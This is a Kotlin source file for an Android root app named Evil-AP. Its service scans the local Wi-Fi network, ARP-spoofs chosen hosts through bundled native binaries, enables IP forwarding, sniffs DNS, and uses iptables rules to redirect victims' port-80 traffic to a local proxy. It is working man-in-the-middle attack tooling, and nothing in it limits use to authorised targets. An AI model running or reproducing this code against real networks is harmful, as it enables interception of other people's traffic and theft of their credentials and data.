package com.nibiru.evilap

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.net.wifi.WifiManager
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.widget.Toast
import com.nibiru.evilap.proxy.ProxyService
import eu.chainfire.libsuperuser.Shell
import io.reactivex.disposables.Disposable
import java.io.Serializable
import java.math.BigInteger
import java.net.InetAddress


class EvilApService: Service() {
    /**************************************CLASS FIELDS********************************************/
    private val TAG = javaClass.simpleName
    private val NOTIFICATION_ID = 666
    private val NOTIFICATION_CHANNEL_ID = "evilap_notification_channel"
    enum class service(val action: String) {
        ACTION_STOP_SERVICE("com.nibiru.evilap.service_stop"),
        ACTION_SCAN_ACTIVE("com.nibiru.evilap.service_scan_active"),
        ACTION_ARP_SPOOF_ON("com.nibiru.evilap.service_arp_spoof_start"),
        ACTION_ARP_SPOOF_OFF("com.nibiru.evilap.service_arp_spoof_stop"),
        ACTION_DNS_SNIFF("com.nibiru.evilap.service_dns_sniff"),
    }
    private var mDispService: Disposable? = null
    private var mDispCheckedHosts: Disposable? = null
    private var mCheckedHosts: MutableList<Host> = ArrayList()
    private var mShells: MutableList<Shell.Interactive> = ArrayList()
    private lateinit var myIp: String
    private lateinit var gateway: String
    var mWantsToStop = false
    // This service is only bound from inside the same process and never uses IPC.
    internal inner class LocalBinder : Binder() {
        val service = this@EvilApService
    }
    private val mBinder = LocalBinder()
    /**************************************CLASS METHODS*******************************************/
    override fun onCreate() {
        setupNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification())
    }

    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
        Log.d(TAG, "got intent = ${intent.action}")
        when(intent.action){
            service.ACTION_STOP_SERVICE.action -> exit()
        }
        setupEventBus()
        // If this service really do get killed, there is no point restarting it automatically
        return Service.START_NOT_STICKY
    }

    private fun setupEventBus(){
        if (mDispService != null && !mDispService!!.isDisposed) return
        mDispService = RxEventBus.INSTANCE.getObservable().subscribe({
            Log.d(TAG, "got event = $it")
            when (it) {
                service.ACTION_STOP_SERVICE -> exit()
                is EventActiveScan -> {
                    nativeActiveScan("wlan0")
                } //TODO: check wifi connectivity
                is EventArpSpoof -> {
                    nativeArpSpoof(it.state)
                }
                is EventHttpProxy -> {
                    lateinit var cmds: List<String>
                    if(it.state)
                        cmds = listOf(
                                "iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
                                "ip6tables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
                    else
                        cmds = listOf(
                                "iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
                                "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
                    getIdleShell().addCommand(cmds)
                }
            }
        })
        if (mDispCheckedHosts != null && !mDispCheckedHosts!!.isDisposed) return
        mDispCheckedHosts = RxEventBus.INSTANCE.busCheckedHosts.subscribe({
            Log.d(TAG, "got event = $it")
            if(it.present)
                mCheckedHosts.add(it)
            else
                mCheckedHosts.removeAt(mCheckedHosts.indexOfFirst { el: Host -> it.mac == el.mac })
        })
    }

    private fun buildNotification(): Notification {
        val notifyIntent = Intent(this, MainActivity::class.java)
        // PendingIntent#getActivity(): "Note that the activity will be started outside of the context of an existing
        // activity, so you must use the Intent.FLAG_ACTIVITY_NEW_TASK launch flag in the Intent":
        notifyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        val pendingIntent = PendingIntent.getActivity(this, 0, notifyIntent, 0)
        val exitIntent = Intent(this, EvilApService::class.java)
                .setAction(service.ACTION_STOP_SERVICE.action)
        val builder = Notification.Builder(this)
        builder.setContentTitle(getText(R.string.app_name))
                .setContentText("${mShells.size} active shells")
                .setSmallIcon(R.drawable.ic_evilap)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setShowWhen(false) // No need to show a timestamp
                .setColor(-0x1000000) // Background color for small notification ic_evilap
                .addAction(R.drawable.ic_exit_black_24dp, resources.getString(R.string.notification_action_exit),
                        PendingIntent.getService(this, 0, exitIntent, 0))
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder.setChannelId(NOTIFICATION_CHANNEL_ID)
        }
        return builder.build()
    }

    @SuppressLint("WrongConstant")
    private fun setupNotificationChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val importance = android.app.NotificationManager.IMPORTANCE_LOW
        val channel = NotificationChannel(NOTIFICATION_CHANNEL_ID, "Evil-AP", importance)
        channel.description = "Notifications from Evil-AP"
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.createNotificationChannel(channel)
    }

    private fun updateNotification() {
        // Update the shown foreground service notification after making any changes that affect it.
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .notify(NOTIFICATION_ID, buildNotification())
    }

    override fun onBind(intent: Intent?): IBinder = mBinder

    private fun exit(){
        mWantsToStop = true
        if (mDispService!=null && !mDispService!!.isDisposed) mDispService!!.dispose()
        if (mDispCheckedHosts!=null && !mDispCheckedHosts!!.isDisposed) mDispCheckedHosts!!.dispose()
        // notify other components
        RxEventBus.INSTANCE.send(EventExit())
        getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
        nativeArpSpoof(false)
        for (shell in mShells)
            shell.close()
        stopSelf()
    }

    private fun openRootShell(): Shell.Interactive {
        // start the shell in the background and keep it alive as long as the app is running
        val shell = Shell.Builder().useSU().setWantSTDERR(true)
                .setWatchdogTimeout(0).setMinimalLogging(true).open { commandCode, exitCode, output ->
                    // Callback to report whether the shell was successfully started up
                    if (exitCode != Shell.OnCommandResultListener.SHELL_RUNNING) {
                        Log.e(TAG,"Error opening root shell: exitCode=$exitCode")
                    }
                    else {
                        Log.d(TAG,"Root shell opened")
                    }
                }
        mShells.add(shell)
        updateNotification()
        return shell
    }

    private fun getIdleShell(): Shell.Interactive {
        for(shell in mShells){
            if(shell.isIdle) return shell
            if(!shell.isRunning) {
                mShells.remove(shell)
                updateNotification()
            }
        }
        return openRootShell()
    }

    private fun nativeActiveScan(iface: String) {
        val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
        myIp = int2ip(manager.dhcpInfo.ipAddress)
        gateway = int2ip(manager.dhcpInfo.gateway)

        val path = applicationInfo.dataDir
        val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libscanner.so wlan0 active-arp"
        getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                    override fun onCommandResult(commandCode: Int, exitCode: Int) {
                        Log.i("[native]SCANNER", "$cmd \n(exit code: $exitCode)")
                    }
                    override fun onLine(line: String) {
                        Log.d("[native]SCANNER", line)
                        if(!line.contains("=>")) return
                        val elements = line.split("=>")
                        when(elements[0]){
                            myIp -> RxEventBus.INSTANCE.busScannedHosts
                                    .onNext(Host(elements[0],elements[1],"this", true))
                            gateway -> RxEventBus.INSTANCE.busScannedHosts
                                    .onNext(Host(elements[0],elements[1],"gateway", true))
                            else -> RxEventBus.INSTANCE.busScannedHosts
                                    .onNext(Host(elements[0],elements[1],"host", true))
                        }
                    }
                })
    }

    private fun nativeDnsSniff(iface: String) {
        val whitelist = listOf("wlan0")
        if(!whitelist.contains(iface)){
            Log.e(TAG, "nativeDnsSniff: bad interface!")
            return
        }
        val shell = getIdleShell()
        val path = applicationInfo.dataDir
        val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libdnssniff.so $iface"
        shell.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
            override fun onCommandResult(commandCode: Int, exitCode: Int) {
                Log.i("ROOT", "$cmd \n(exit code: $exitCode)")
            }
            override fun onLine(line: String) {
                Log.d("ROOT", line)
            }
        })

    }

    private fun nativeArpSpoof(spoofing: Boolean){
        val path = applicationInfo.dataDir
        if(spoofing){
            val allIp = mCheckedHosts.map{ it.ip }
            if(myIp in allIp){
                Toast.makeText(applicationContext,
                        "Cannot use $myIp as target! (this device)", Toast.LENGTH_LONG).show()
                return
            }
            if(gateway in allIp){
                Toast.makeText(applicationContext,
                        "Cannot use $gateway as target! (LAN gateway)", Toast.LENGTH_LONG).show()
                return
            }
            val cmds = listOf(
                    "iptables -t filter -I FORWARD -i wlan0 -j ACCEPT",
                    "sysctl -w net.ipv4.ip_forward=1",
                    "sysctl -w net.ipv6.conf.all.forwarding=1",
                    "sysctl -w net.ipv4.conf.all.send_redirects=0")
            getIdleShell().addCommand(cmds)
            for(host in mCheckedHosts) {
                val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libarpspoof.so $gateway ${host.ip}"
                getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                    override fun onCommandResult(commandCode: Int, exitCode: Int) {
                        Log.i("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
                    }
                    override fun onLine(line: String) {
                        Log.d("[native]ARPSPOOF", line)
                    }
                })
            }
        }
        else{
            Log.d(TAG, "killing ARPSPOOF")
            val cmds = listOf(
                    "pkill -f $path/lib/libarpspoof.so",
                    "iptables -t filter -D FORWARD -i wlan0 -j ACCEPT",
                    "sysctl -w net.ipv4.ip_forward=0",
                    "sysctl -w net.ipv6.conf.all.forwarding=0",
                    "sysctl -w net.ipv4.conf.all.send_redirects=1")
            getIdleShell().addCommand(cmds)
        }
    }

    private fun int2ip(int: Int): String{
        val myIPAddress = BigInteger.valueOf(int.toLong()).toByteArray()
        myIPAddress.reverse()
        val myInetIP = InetAddress.getByAddress(myIPAddress)
        return myInetIP.hostAddress
    }


    data class Host(val ip: String, val mac: String, var type: String, var present: Boolean): Serializable
    class EventExit
    data class EventActiveScan(val type: String)
    data class EventArpSpoof(val state: Boolean)
    data class EventHttpProxy(val state: Boolean)
}